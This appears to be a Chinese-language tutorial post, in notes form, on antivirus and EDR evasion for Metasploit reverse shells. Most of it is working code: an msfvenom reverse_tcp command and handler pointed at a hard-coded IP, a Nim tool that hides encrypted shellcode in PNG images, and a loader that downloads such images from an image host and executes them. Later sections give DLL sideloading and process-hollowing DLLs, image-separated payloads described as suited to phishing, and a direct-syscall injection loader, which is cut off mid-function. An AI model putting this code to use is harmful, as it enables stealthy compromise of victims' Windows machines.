~~~
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=129.226.92.29 lport=10010 -f hex
~~~

[![ppoQWnO.png](https://s1.ax1x.com/2023/04/06/ppoQWnO.png)](https://imgse.com/i/ppoQWnO)

直接开启监听传递参数执行上线

~~~
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lhost 129.226.92.29
set lport 10010
exploit
~~~

[![ppoQxEQ.png](https://s1.ax1x.com/2023/04/06/ppoQxEQ.png)](https://imgse.com/i/ppoQxEQ)

[![ppol9Cn.png](https://s1.ax1x.com/2023/04/06/ppol9Cn.png)](https://imgse.com/i/ppol9Cn)

###### 3-图片隐写

~~~nim
import nimPNG
import nimcrypto
import nimcrypto/sysrand
import strutils
import stew/byteutils except toHex
import os

type
  Image* = ref object
    ## Main image object that holds the bitmap data.
    filePath*: string
    width*, height*: int
    data*: seq[uint8]

proc loadImageB*(imgFile: string): Image =
    var mypng = Image()
    let png = loadPNG32(imgFile)
    mypng.width = png.width
    mypng.height = png.height
    mypng.data = cast[seq[uint8]](png.data)  
    return mypng
    
proc loadImage*(rawData: string): Image =
    var mypng = Image()
    #let png = loadPNG32(imgFile)
    let png = decodePNG32(rawData)
    mypng.width = png.width
    mypng.height = png.height
    mypng.data = cast[seq[uint8]](png.data)  
    return mypng    
    
proc saveFile*(image: Image, fileName: string) =
    discard savePNG32(fileName, image.data, image.width, image.height)

proc encodeMessage*(image: Image, rawdata: string) =
  let filesize = cast[uint64](len(rawdata))
  let header = filesize.toHex(8)
  var data = header & rawdata 
  
  ## Hide data inside an image
  echo "[*] Input image size: ", image.width, "x", image.height, " pixels."
  echo "[*] Usable payload size: ", image.width * image.height, "B."
  echo "[+] Encrypted payload size: ", len(data), "B."
  
  if len(data) > image.width * image.height :
    echo "[-] Cannot embed. File too large"
    quit(-1)
    
  for i in 0..data.len:
    var dataByte: uint8
    if i < data.len:
      dataByte = uint8(data[i])
    image.data[i*4+0] = (image.data[i*4+0] and 0b11111100) + (dataByte and 0b00000011) shr 0
    image.data[i*4+1] = (image.data[i*4+1] and 0b11111100) + (dataByte and 0b00001100) shr 2
    image.data[i*4+2] = (image.data[i*4+2] and 0b11111100) + (dataByte and 0b00110000) shr 4
    image.data[i*4+3] = (image.data[i*4+3] and 0b11111100) + (dataByte and 0b11000000) shr 6
  echo "[+] Embedded successfully!"
  
proc decodeMessage*(image: Image): string =
  ## Extract hidden data in the image
  echo "[*] Input image size: ", image.width, "x", image.height, " pixels."
  
  result = ""
  
  for i in 0..<(image.data.len div 4):
    var dataByte: uint8
    dataByte += (image.data[i*4+0] and 0b11) shl 0
    dataByte += (image.data[i*4+1] and 0b11) shl 2
    dataByte += (image.data[i*4+2] and 0b11) shl 4
    dataByte += (image.data[i*4+3] and 0b11) shl 6
    result.add char(dataByte)

  var header = result[0..7]
  var filesize = fromHex[uint64](header) + 7
  return result[8..filesize]



func toByteSeq*(str: string): seq[byte] {.inline.} =
  ## Converts a string to the corresponding byte sequence.
  @(str.toOpenArrayByte(0, str.high))

proc encryptFile*(fileName: string, envkey: string): string =
    var
        data: seq[byte] = toByteSeq(readFile(fileName))
        ectx: CTR[aes256]
        key: array[aes256.sizeKey, byte]
        iv: array[aes256.sizeBlock, byte]
        plaintext = newSeq[byte](len(data))
        enctext = newSeq[byte](len(data))
       
    #discard randomBytes(addr iv[0], 16)
    iv = [byte 39, 215, 183, 62, 212, 75, 101, 46, 85, 66, 92, 49, 164, 183, 14, 146]
    copyMem(addr plaintext[0], addr data[0], len(data))
    var expandedkey = sha256.digest(envkey)
    copyMem(addr key[0], addr expandedkey.data[0], len(expandedkey.data))

    ectx.init(key, iv)
    ectx.encrypt(plaintext, enctext)
    ectx.clear()    
        
    var res = newString(len(enctext))
    copyMem(addr res[0], addr enctext[0], len(enctext))
    result = res

proc decrypt*(data: string, envkey: string): seq[byte] =
    var 
        dctx: CTR[aes256]
        key: array[aes256.sizeKey, byte]
        iv: array[aes256.sizeBlock, byte]
        enctext = newSeq[byte](len(data))
        dectext = newSeq[byte](len(data))
        
    iv = [byte 39, 215, 183, 62, 212, 75, 101, 46, 85, 66, 92, 49, 164, 183, 14, 146]
    enctext = toByteSeq(data)
    
    var expandedkey = sha256.digest(envkey)
    copyMem(addr key[0], addr expandedkey.data[0], len(expandedkey.data))
    
    dctx.init(key, iv)
    dctx.decrypt(enctext, dectext)
    dctx.clear()
    #writeFile(fileName, dectext)
    return dectext

proc help() =
    let pathSplit = splitPath(paramStr(0))
    echo "Usage:"
    echo "  ", pathSplit.tail, " en pngFile embedFile password"
    echo "  ", pathSplit.tail, "de pngFile outFile password"
    echo ""
    echo "Example:"
    echo "  Embed a file into an image."
    echo "  ", pathSplit.tail, " en logo.png beacon.bin 12345678"
    echo "  Extract hidden data in the image."
    echo "  ", pathSplit.tail, " de logo_out.png beacon.bin 12345678"
    
proc main() =
    if paramCount() > 0:
        var p1 = paramStr(1)
        if paramCount() < 2 or p1 in ["/?","-h","--help"]:
            help()
        else:
            var 
                mode = paramStr(1)
                imgFile = paramStr(2)
                userFile = paramStr(3)
                password = paramStr(4)
            if mode == "en":
                var enctext = encryptFile(userFile, password)
                var mypng = loadImage(readFile(imgFile))
                var fileName = ""
                
                let fileSplit = splitFile(imgFile)
                fileName = joinPath(fileSplit.dir, fileSplit.name & "_out" & fileSplit.ext)
                encodeMessage(mypng, enctext)
                mypng.saveFile(fileName)
                echo "[+] fileName: ", fileName
            if mode == "de":
                var mypng = loadImage(readFile(imgFile))
                var enctext = decodeMessage(mypng)
                var dectext = decrypt(enctext, password)
                writeFile(userFile, dectext)
                echo "[+] Written extracted data to ", userFile
    else:
        help()

when isMainModule:
    main()
~~~



~~~
.\batmanfuture.exe en 123.png payload.bin batmanfuture
~~~



将shellcode加载

~~~nim
import shellcodeCallback
import lsb
import random
import os
import httpclient
import strutils

proc help() =
    let pathSplit = splitPath(paramStr(0))
    echo "Usage:"
    echo pathSplit.tail, " filename/url password"
    echo pathSplit.tail, " https://www.test.com/logo.png 12345678"
    echo pathSplit.tail, " logo.png 12345678"    

proc main(imgFile,password: string) =
    randomize()
    var 
        shellcode: seq[byte]
        mypng: Image
        enctext: string
        content: string

    try:        
        if fileExists(imgFile):
            mypng = loadImage(readFile(imgFile))
            enctext = decodeMessage(mypng)
            shellcode = decrypt(enctext, password)
        else:
            var client = newHttpClient()
            content = getContent(client, imgFile)
            mypng = loadImage(content)
            enctext = decodeMessage(mypng)
            shellcode = decrypt(enctext, password)    
    except:
        echo getCurrentException().msg
        quit()
            

    case rand(1..17)
    of 1:
        doEnumSystemGeoID(shellcode)
    of 2:
        doCertEnumSystemStore(shellcode)
    of 3:
        doCertEnumSystemStoreLocation(shellcode)
    of 4:
        doCopy2(shellcode)
    of 5:
        doCopyFileExW(shellcode)
    of 6:
        doEnumChildWindows(shellcode)
    of 7:
        doEnumDesktopWindows(shellcode)
    of 8:
        doEnumPageFilesW(shellcode)
    of 9:
        doImageGetDigestStream(shellcode)
    of 10:
        doEnumDateFormatsA(shellcode)
    of 11:
        doEnumSystemCodePagesA(shellcode)
    of 12:
        doEnumSystemLanguageGroupsA(shellcode)
    of 13:
        doEnumSystemLocalesA(shellcode)
    of 14:
        doEnumThreadWindows(shellcode)
    of 15:
        doEnumWindows(shellcode)
    of 16:
        doEnumUILanguagesA(shellcode)
    of 17:
        doSymEnumProcesses(shellcode)
    else:
        echo "unknown command"
    
when isMainModule:
    when defined(windows):
        if paramCount() > 0:
            var p1 = paramStr(1)
            if paramCount() < 2 or p1 in ["/?","-h","--help"]:
                help()
            else:
                if fileExists(p1.toLowerAscii()) or p1.toLowerAscii().startsWith("http://") or p1.toLowerAscii().startsWith("https://"):
                    main(paramStr(1), paramStr(2))
                else:
                    help()
        else:
            help()
~~~

把隐写图片放在图床上

https://s1.ax1x.com/2023/04/06/ppo6nmD.png

~~~
shellcodein.exe https://s1.ax1x.com/2023/04/06/ppo6nmD.png batmanfuture
~~~





调用uuid，mac，ipv4执行shellcode



### 源码免杀后免杀

~~~
特征码查杀
文件和校验法
沙盒校验法
云查杀
~~~



~~~
加壳
花指令
特征码修改
~~~





### DLL注入-加载器



##### DLL劫持

~~~
将shellcode放在由c编写的dll里，通过python去调用dll上线
~~~

[![ppTsaOU.png](https://s1.ax1x.com/2023/04/07/ppTsaOU.png)](https://imgse.com/i/ppTsaOU)

c语言

~~~c
#include <stdio.h>
#include <stdlib.h>
#include <wtypes.h>

#ifdef _WIN32
#   define EXPORT __declspec(dllexport)
#else
#   define EXPORT
#endif

unsigned char buf[] =
"\xfc\x48";

// 定义 test 函数
EXPORT int test() {
    printf("Hello from test function!\n");

    char* Memory;
    Memory = VirtualAlloc(NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy(Memory, buf, sizeof(buf));
    ((void(*)())Memory)();


    return 42;
}

// 定义 DLL 入口函数
BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
~~~

python

~~~python
from ctypes import *

#利用python载入dll文件
lib=CDLL('./batmanfuture.dll')
#调用dll文件内置方法函数

result = lib.test()
print(result)
~~~

[![ppTclwD.png](https://s1.ax1x.com/2023/04/07/ppTclwD.png)](https://imgse.com/i/ppTclwD)





### 白加黑

##### 导入加载

~~~
首先找到一个exe，将他所加载的一个dll在同一个目录下
打开powertools，运行exe，找到那个exe引入的dll文件
~~~

[![ppTow2F.png](https://s1.ax1x.com/2023/04/07/ppTow2F.png)](https://imgse.com/i/ppTow2F)

因为kk播放器是的dll是32位的，故我们生成的dll也是32位的

~~~c++
// dllmain.cpp : 定义 DLL 应用程序的入口点。
#include<windows.h>
#include<iostream>

HANDLE My_hThread = NULL;
unsigned char shellcode[] = "\xfc";
DWORD  WINAPI  ceshi(LPVOID pParameter)
{
    __asm
    {
        mov eax, offset shellcode
        jmp eax
    }
    return 0;
}
BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH://初次调用dll时执行下面代码
        My_hThread = ::CreateThread(NULL, 0, &ceshi, 0, 0, 0);//新建线程
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
extern"C" _declspec(dllexport) void test()
{
    int a;
    a = 0;
}
~~~

利用studype工具，将我们生成的dll导入到其dll的函数

然后运行kk播放器就加载了原有dll，该dll的导入函数中有我们的恶意dll，故而加载我们的dll的函数，实现上线

[![ppTohxe.png](https://s1.ax1x.com/2023/04/07/ppTohxe.png)](https://imgse.com/i/ppTohxe)



##### 导出编译

利用dependencies工具导出krpt.dll

[![ppTbBJx.png](https://s1.ax1x.com/2023/04/07/ppTbBJx.png)](https://imgse.com/i/ppTbBJx)

右键那里导出，导出之后是这三个文件

[![ppTb6yD.png](https://s1.ax1x.com/2023/04/07/ppTb6yD.png)](https://imgse.com/i/ppTb6yD)

添加到vs2022的源文件和头文件里，源文件把这三个复制过去，头文件右键添加现有项导入

[![ppTb5fP.png](https://s1.ax1x.com/2023/04/07/ppTb5fP.png)](https://imgse.com/i/ppTb5fP)

1）将所有的jmp语句去掉

[![ppTbLwj.png](https://s1.ax1x.com/2023/04/07/ppTbLwj.png)](https://imgse.com/i/ppTbLwj)

2）

[![ppTbjkn.png](https://s1.ax1x.com/2023/04/07/ppTbjkn.png)](https://imgse.com/i/ppTbjkn)

[![ppTq96U.png](https://s1.ax1x.com/2023/04/07/ppTq96U.png)](https://imgse.com/i/ppTq96U)

3）命令行输入

~~~
命令行: ml /Fo $(IntDir)%(fileName).obj /c /Cp %(fileName).asm
输出: $(IntDir)%(fileName).obj;%(Outputs)
~~~

[![ppTqim4.png](https://s1.ax1x.com/2023/04/07/ppTqim4.png)](https://imgse.com/i/ppTqim4)

4）

[![ppTqVt1.png](https://s1.ax1x.com/2023/04/07/ppTqVt1.png)](https://imgse.com/i/ppTqVt1)[![ppTqZfx.png](https://s1.ax1x.com/2023/04/07/ppTqZfx.png)](https://imgse.com/i/ppTqZfx)

[![ppTqQne.png](https://s1.ax1x.com/2023/04/07/ppTqQne.png)](https://imgse.com/i/ppTqQne)

5）写入上线shellcode

~~~c++
#include "krpt.h"
#include "windows.h"

BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
	{
		unsigned char hexData[] = "\xfc\xe8";

		char* v7A = (char*)VirtualAlloc(0, _countof(hexData), 0x3000u, 0x40u);
		memcpy((void*)v7A, hexData, _countof(hexData));

		struct _PROCESS_INFORMATION ProcessInformation;
		struct _STARTUPINFOA StartupInfo;
		void* v24;
		CONTEXT Context;
		DWORD DwWrite = 0;
		memset(&StartupInfo, 0, sizeof(StartupInfo));
		StartupInfo.cb = 68;
		BOOL result = CreateProcessA(0, (LPSTR)"rundll32.exe", 0, 0, 0, 0x44u, 0, 0, &StartupInfo, &ProcessInformation);
		if (result)
		{
			Context.ContextFlags = 65539;
			GetThreadContext(ProcessInformation.hThread, &Context);
			v24 = VirtualAllocEx(ProcessInformation.hProcess, 0, _countof(hexData), 0x1000u, 0x40u);
			WriteProcessMemory(ProcessInformation.hProcess, v24, v7A, _countof(hexData), &DwWrite);
			Context.Eip = (DWORD)v24;
			SetThreadContext(ProcessInformation.hThread, &Context);
			ResumeThread(ProcessInformation.hThread);
			CloseHandle(ProcessInformation.hThread);
			result = CloseHandle(ProcessInformation.hProcess);
		}


		TerminateProcess(GetCurrentProcess(), 0);
	};

	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}
~~~

编译成krpt.dll，放在一个目录下运行上线

[![ppTbtL4.png](https://s1.ax1x.com/2023/04/07/ppTbtL4.png)](https://imgse.com/i/ppTbtL4)



但是以上很容易被杀，故我们要分离

##### 图片分离

利用DKMC工具将shellcode隐写在图片中

~~~
python2 dkmc.py
gen
set shellcode xxx
~~~

[![ppTXBHe.png](https://s1.ax1x.com/2023/04/07/ppTXBHe.png)](https://imgse.com/i/ppTXBHe)

源代码

~~~c++
#include "framework.h"
#include "windows.h"
#include "krpt.h"
#include <stdlib.h>
#include <stdio.h>


BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    {
        FILE* fp;  // 定义流式文件操作变量fp，FILE结构体在stdio.h里面有定义
        size_t size;  // 定义文件字节数变量size
        unsigned char* buffer;  // 定义缓存指针变量

        fp = fopen("batmanfuture.bmp", "rb");
        // fseek()负号前移，正号后移
        fseek(fp, 0, SEEK_END);          // 文件指针指向文件末尾
        // ftell()返回给定流 stream 的当前文件位置
        size = ftell(fp);                // size值为文件大小
        fseek(fp, 0, SEEK_SET);          // 文件指针指向文件开头
        buffer = (unsigned char*)malloc(size);    // 动态申请图片大小的内存空间（数组指针）
        fread(buffer, size, 1, fp);  // 从fp读取和显示1个size大小的数据

        char* v7A = (char*)VirtualAlloc(0, size, 0x3000u, 0x40u);
        memcpy((void*)v7A, buffer, size);

        struct _PROCESS_INFORMATION ProcessInformation;
        struct _STARTUPINFOA StartupInfo;
        void* v24;
        CONTEXT Context;
        DWORD DwWrite = 0;
        memset(&StartupInfo, 0, sizeof(StartupInfo));
        StartupInfo.cb = 68;
        BOOL result = CreateProcessA(0, (LPSTR)"rundll32.exe", 0, 0, 0, 0x44u, 0, 0, &StartupInfo, &ProcessInformation);
        if (result)
        {
            Context.ContextFlags = 65539;
            GetThreadContext(ProcessInformation.hThread, &Context);
            v24 = VirtualAllocEx(ProcessInformation.hProcess, 0, size, 0x1000u, 0x40u);
            WriteProcessMemory(ProcessInformation.hProcess, v24, v7A, size, &DwWrite);
            Context.Eip = (DWORD)v24;
            SetThreadContext(ProcessInformation.hThread, &Context);
            ResumeThread(ProcessInformation.hThread);
            CloseHandle(ProcessInformation.hThread);
            result = CloseHandle(ProcessInformation.hProcess);
        }


        TerminateProcess(GetCurrentProcess(), 0);
    };
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
~~~

编译，报了个错误

[![ppTjFv6.png](https://s1.ax1x.com/2023/04/07/ppTjFv6.png)](https://imgse.com/i/ppTjFv6)

https://blog.csdn.net/weixin_44788542/article/details/116235303

~~~
_CRT_SECURE_NO_WARNINGS
~~~

[![ppTjhxx.png](https://s1.ax1x.com/2023/04/07/ppTjhxx.png)](https://imgse.com/i/ppTjhxx)

重新编译生成，将xxx.dll和图片，还有xxx.exe放在一起

运行直接上线

![a35df380acf6c77db1971584164166d6.png](https://s1.imagehub.cc/images/2023/04/07/a35df380acf6c77db1971584164166d6.png)

![ff7f8b8484ed7ed1768bd388262e877e.png](https://s1.imagehub.cc/images/2023/04/07/ff7f8b8484ed7ed1768bd388262e877e.png)

.

适用于钓鱼式



### syscall

https://j00ru.vexillium.org/syscalls/nt/64/

在msf中生成一个payload.bin

在

~~~
EDR-Bypass-demo-main\EDR-Bypass-demo-main\chapter4-demo2
~~~

中修改enc.py里的1.txt位payload.bin，执行python enc.py生成了加密后对的shellcode

~~~c++
// demo1.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <iostream>
#include <windows.h>
#include "header.h"
#include "base64.h"
#include "nt.h"
using namespace std;

unsigned char* ReadProcessBlob(const char* fnamSc, DWORD* szSc)
{
	DWORD szRead{ 0 };

	HANDLE hFile = CreateFileA(
		fnamSc,
		GENERIC_READ,
		NULL,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL
	);

	if (INVALID_HANDLE_VALUE == hFile)
		return nullptr;

	SIZE_T szFile = GetFileSize(hFile, NULL);
	*szSc = szFile;

	unsigned char* raw = new unsigned char[szFile];
	unsigned char* sc = new unsigned char[szFile];

	if (!ReadFile(hFile, raw, szFile, &szRead, NULL))
		return nullptr;

	int i;

	for (i = 0; i < szRead; i++) {
		sc[i] = raw[i] ^ XOR_KEY;
	}

	return sc;
}


std::string replace(const std::string& inStr, const char* pSrc, const char* pReplace)

{
	std::string str = inStr;
	std::string::size_type stStart = 0;
	std::string::iterator iter = str.begin();
	while (iter != str.end())

	{
		std::string::size_type st = str.find(pSrc, stStart);

		if (st == str.npos)

		{
			break;
		}

		iter = iter + st - stStart;
		str.replace(iter, iter + strlen(pSrc), pReplace);
		iter = iter + strlen(pReplace);
		stStart = st + strlen(pReplace);
	}

	return str;

}

LPVOID GetSuitableBaseAddress(HANDLE hProc, DWORD szPage, DWORD szAllocGran, DWORD cVmResv)
{
	MEMORY_BASIC_INFORMATION mbi;

	for (auto base : VC_PREF_BASES) {
		VirtualQueryEx(
			hProc,
			base,
			&mbi,
			sizeof(MEMORY_BASIC_INFORMATION)
		);

		if (MEM_FREE == mbi.State) {
			uint64_t i;
			for (i = 0; i < cVmResv; ++i) {
				LPVOID currentBase = (void*)((DWORD_PTR)base + (i * szAllocGran));
				VirtualQueryEx(
					hProc,
					currentBase,
					&mbi,
					sizeof(MEMORY_BASIC_INFORMATION)
				);
				if (MEM_FREE != mbi.State)
					break;
			}
			if (i == cVmResv) {
				// found suitable base
				return base;
			}
		}
	}
	return nullptr;
}

#ifdef _M_IX86

EXTERN_C PVOID internal_cleancall_wow64_gate(VOID) {
	return (PVOID)__readfsdword(0xC0);
}

__declspec(naked) BOOL local_is_wow64(void)
{
	__asm {
		mov eax, fs: [0xc0]
		test eax, eax
		jne wow64
		mov eax, 0
		ret
		wow64 :
		mov eax, 1
			ret
	}
}


#endif

// Code below is adapted from @modexpblog. Read linked article for more details.
// https://www.mdsec.co.uk/2020/12/bypassing-user-mode-hooks-and-direct-invocation-of-system-calls-for-red-teams

SW3_SYSCALL_LIST SW3_SyscallList;

// SEARCH_AND_REPLACE
#ifdef SEARCH_AND_REPLACE
// THIS IS NOT DEFINED HERE; don't know if I'll add it in a future release
EXTERN void SearchAndReplace(unsigned char[], unsigned char[]);
#endif

DWORD SW3_HashSyscall(PCSTR FunctionName)
{
	DWORD i = 0;
	DWORD Hash = SW3_SEED;

	while (FunctionName[i])
	{
		WORD PartialName = *(WORD*)((ULONG_PTR)FunctionName + i++);
		Hash ^= PartialName + SW3_ROR8(Hash);
	}

	return Hash;
}

#ifndef JUMPER
PVOID SC_Address(PVOID NtApiAddress)
{
	return NULL;
}
#else
PVOID SC_Address(PVOID NtApiAddress)
{
	DWORD searchLimit = 512;
	PVOID SyscallAddress;

#ifdef _WIN64
	// If the process is 64-bit on a 64-bit OS, we need to search for syscall
	BYTE syscall_code[] = { 0x0f, 0x05, 0xc3 };
	ULONG distance_to_syscall = 0x12;
#else
	// If the process is 32-bit on a 32-bit OS, we need to search for sysenter
	BYTE syscall_code[] = { 0x0f, 0x34, 0xc3 };
	ULONG distance_to_syscall = 0x0f;
#endif

#ifdef _M_IX86
	// If the process is 32-bit on a 64-bit OS, we need to jump to WOW32Reserved
	if (local_is_wow64())
	{
#ifdef DEBUG
		printf("[+] Running 32-bit app on x64 (WOW64)\n");
#endif
		return NULL;
	}
#endif

	// we don't really care if there is a 'jmp' between
	// NtApiAddress and the 'syscall; ret' instructions
	SyscallAddress = SW3_RVA2VA(PVOID, NtApiAddress, distance_to_syscall);

	if (!memcmp((PVOID)syscall_code, SyscallAddress, sizeof(syscall_code)))
	{
		// we can use the original code for this system call :)
#if defined(DEBUG)
		printf("Found Syscall Opcodes at address 0x%p\n", SyscallAddress);
#endif
		return SyscallAddress;
	}

	// the 'syscall; ret' intructions have not been found,
	// we will try to use one near it, similarly to HalosGate

	for (ULONG32 num_jumps = 1; num_jumps < searchLimit; num_jumps++)
	{
		// let's try with an Nt* API below our syscall
		SyscallAddress = SW3_RVA2VA(
			PVOID,
			NtApiAddress,
			distance_to_syscall + num_jumps * 0x20);
		if (!memcmp((PVOID)syscall_code, SyscallAddress, sizeof(syscall_code)))
		{
#if defined(DEBUG)
			printf("Found Syscall Opcodes at address 0x%p\n", SyscallAddress);
#endif
			return SyscallAddress;
		}

		// let's try with an Nt* API above our syscall
		SyscallAddress = SW3_RVA2VA(
			PVOID,
			NtApiAddress,
			distance_to_syscall - num_jumps * 0x20);
		if (!memcmp((PVOID)syscall_code, SyscallAddress, sizeof(syscall_code)))
		{
#if defined(DEBUG)
			printf("Found Syscall Opcodes at address 0x%p\n", SyscallAddress);
#endif
			return SyscallAddress;
		}
	}

#ifdef DEBUG
	printf("Syscall Opcodes not found!\n");
#endif

	return NULL;
}
#endif


BOOL SW3_PopulateSyscallList()
{
	// Return early if the list is already populated.
	if (SW3_SyscallList.Count) return TRUE;

#ifdef _WIN64
	PSW3_PEB Peb = (PSW3_PEB)__readgsqword(0x60);
#else
	PSW3_PEB Peb = (PSW3_PEB)__readfsdword(0x30);
#endif
	PSW3_PEB_LDR_DATA Ldr = Peb->Ldr;
	PIMAGE_EXPORT_DIRECTORY ExportDirectory = NULL;
	PVOID DllBase = NULL;

	// Get the DllBase address of NTDLL.dll. NTDLL is not guaranteed to be the second
	// in the list, so it's safer to loop through the full list and find it.
	PSW3_LDR_DATA_TABLE_ENTRY LdrEntry;
	for (LdrEntry = (PSW3_LDR_DATA_TABLE_ENTRY)Ldr->Reserved2[1]; LdrEntry->DllBase != NULL; LdrEntry = (PSW3_LDR_DATA_TABLE_ENTRY)LdrEntry->Reserved1[0])
	{
		DllBase = LdrEntry->DllBase;
		PIMAGE_DOS_HEADER DosHeader = (PIMAGE_DOS_HEADER)DllBase;
		PIMAGE_NT_HEADERS NtHeaders = SW3_RVA2VA(PIMAGE_NT_HEADERS, DllBase, DosHeader->e_lfanew);
		PIMAGE_DATA_DIRECTORY DataDirectory = (PIMAGE_DATA_DIRECTORY)NtHeaders->OptionalHeader.DataDirectory;
		DWORD VirtualAddress = DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
		if (VirtualAddress == 0) continue;

		ExportDirectory = (PIMAGE_EXPORT_DIRECTORY)SW3_RVA2VA(ULONG_PTR, DllBase, VirtualAddress);

		// If this is NTDLL.dll, exit loop.
		PCHAR DllName = SW3_RVA2VA(PCHAR, DllBase, ExportDirectory->Name);

		if ((*(ULONG*)DllName | 0x20202020) != 0x6c64746e) continue;
		if ((*(ULONG*)(DllName + 4) | 0x20202020) == 0x6c642e6c) break;
	}

	if (!ExportDirectory) return FALSE;

	DWORD NumberOfNames = ExportDirectory->NumberOfNames;
	PDWORD Functions = SW3_RVA2VA(PDWORD, DllBase, ExportDirectory->AddressOfFunctions);
	PDWORD Names = SW3_RVA2VA(PDWORD, DllBase, ExportDirectory->AddressOfNames);
	PWORD Ordinals = SW3_RVA2VA(PWORD, DllBase, ExportDirectory->AddressOfNameOrdinals);

	// Populate SW3_SyscallList with unsorted Zw* entries.
	DWORD i = 0;
	PSW3_SYSCALL_ENTRY Entries = SW3_SyscallList.Entries;
	do
	{
		PCHAR FunctionName = SW3_RVA2VA(PCHAR, DllBase, Names[NumberOfNames - 1]);

		// Is this a system call?
		if (*(USHORT*)FunctionName == 0x775a)
		{
			Entries[i].Hash = SW3_HashSyscall(FunctionName);
			Entries[i].Address = Functions[Ordinals[NumberOfNames - 1]];
			Entries[i].SyscallAddress = SC_Address(SW3_RVA2VA(PVOID, DllBase, Entries[i].Address));

			i++;
			if (i == SW3_MAX_ENTRIES) break;
		}
	} while (--NumberOfNames);

	// Save total number of system calls found.
	SW3_SyscallList.Count = i;

	// Sort the list by address in ascending order.
	for (DWORD i = 0; i < SW3_SyscallList.Count - 1; i++)
	{
		for (DWORD j = 0; j < SW3_SyscallList.Count - i - 1; j++)
		{
			if (Entries[j].Address > Entries[j + 1].Address)
			{
				// Swap entries.
				SW3_SYSCALL_ENTRY TempEntry;

				TempEntry.Hash = Entries[j].Hash;
				TempEntry.Address = Entries[j].Address;
				TempEntry.SyscallAddress = Entries[j].SyscallAddress;

				Entries[j].Hash = Entries[j + 1].Hash;
				Entries[j].Address = Entries[j + 1].Address;
				Entries[j].SyscallAddress = Entries[j + 1].SyscallAddress;

				Entries[j + 1].Hash = TempEntry.Hash;
				Entries[j + 1].Address = TempEntry.Address;
				Entries[j + 1].SyscallAddress = TempEntry.SyscallAddress;
			}
		}
	}

	return TRUE;
}

EXTERN_C DWORD SW3_GetSyscallNumber(DWORD FunctionHash)
{
	// Ensure SW3_SyscallList is populated.
	if (!SW3_PopulateSyscallList()) return -1;

	for (DWORD i = 0; i < SW3_SyscallList.Count; i++)
	{
		if (FunctionHash == SW3_SyscallList.Entries[i].Hash)
		{
			return i;
		}
	}

	return -1;
}

EXTERN_C PVOID SW3_GetSyscallAddress(DWORD FunctionHash)
{
	// Ensure SW3_SyscallList is populated.
	if (!SW3_PopulateSyscallList()) return NULL;

	for (DWORD i = 0; i < SW3_SyscallList.Count; i++)
	{
		if (FunctionHash == SW3_SyscallList.Entries[i].Hash)
		{
			return SW3_SyscallList.Entries[i].SyscallAddress;
		}
	}

	return NULL;
}

EXTERN_C PVOID SW3_GetRandomSyscallAddress(DWORD FunctionHash)
{
	// Ensure SW3_SyscallList is populated.
	if (!SW3_PopulateSyscallList()) return NULL;

	DWORD index = ((DWORD)rand()) % SW3_SyscallList.Count;

	while (FunctionHash == SW3_SyscallList.Entries[index].Hash) {
		// Spoofing the syscall return address
		index = ((DWORD)rand()) % SW3_SyscallList.Count;
	}
	return SW3_SyscallList.Entries[index].SyscallAddress;
}



int main()
{
	bool all_tests_passed = false;

	std::string rest2_reference = "bfUFBQQA0ICAgIWMvgl/X39zk6MSY6Oj4mMTomOjEIMtZguQ@@";

	std::string rest3_reference = replace(rest2_reference, "@@", "==");

	std::string rest2_decoded = base64_decode(rest3_reference);

	const char* S = rest2_decoded.c_str();




	HANDLE hProc = OpenProcess(
		PROCESS_ALL_ACCESS,
		FALSE,
		8696
	);

	SYSTEM_INFO sys_inf;
	GetSystemInfo(&sys_inf);

	DWORD page_size{ sys_inf.dwPageSize };
	DWORD alloc_gran{ sys_inf.dwAllocationGranularity };

	SIZE_T szVmResv{ alloc_gran };
	SIZE_T szVmCmm{ page_size };
	DWORD  cVmResv = (rest2_decoded.length() / szVmResv) + 1;
	DWORD  cVmCmm = szVmResv / szVmCmm;

	LPVOID vmBaseAddress = GetSuitableBaseAddress(
		hProc,
		szVmCmm,
		szVmResv,
		cVmResv
	);
	LPVOID    currentVmBase{ vmBaseAddress };
	NTSTATUS  status{ 0 };
	vector<LPVOID>  vcVmResv;

	//alloc memeory
	for (int i = 1; i <= cVmResv; ++i)
	{

		status = BNtAVM(
			hProc,
			&currentVmBase,
			NULL,
			&szVmResv,
			MEM_RESERVE,
			PAGE_NOACCESS
		);
		if (STATUS_SUCCESS == status) {
			vcVmResv.push_back(currentVmBase);
		}
		else {

			std::cout << "AVM error";
		}
		currentVmBase = (LPVOID)((DWORD_PTR)currentVmBase + szVmResv);
	}

	DWORD           offsetSc{ 0 };
	DWORD           oldProt;

	double prcDone{ 0 };

	DWORD     cmm_i;
	for (int i = 0; i < cVmResv; ++i)
	{
		unsigned char* sc = new unsigned char[szVmCmm];
		for (int j = 0; j < szVmCmm; j++) {
			//cout << szVmCmm * i + j << endl;
			sc[j] = S[szVmCmm * i + j] ^ XOR_KEY;
		}

